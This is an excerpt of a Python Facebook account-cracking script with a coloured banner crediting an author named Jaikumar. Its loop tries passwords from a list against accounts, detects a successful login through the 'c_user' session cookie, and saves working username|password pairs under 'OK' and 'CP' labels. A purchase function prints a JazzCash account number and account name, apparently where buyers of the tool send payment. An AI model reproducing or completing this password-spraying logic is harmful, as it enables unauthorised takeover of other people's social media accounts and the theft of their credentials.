...
\033[1;93m------------------------\033[1;96m------------------------
\033[1;33m\033[1;32m Author \x1b[1;96m :\033[1;32m JAIKUMAR
\033[1;33m\033[1;33m Facebook\x1b[1;96m:\033[1;33m JAIKUMAR
\033[1;33m\033[1;36m GitHub\x1b[1;96m  :\033[1;36m JAIKUMAR
        ...
        try:
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H}[Jaikumar-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    ...
                    try:
                        ...
                        print('\r%s[Jaikumar-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
...
def bnsbuy():
    ...
    if to in r:
        ...
        print
        print('\rjazzcash Account Number 03312734753\n')
        print('\rAccount Name Jaikumar Parhyar\n')
        print
        print
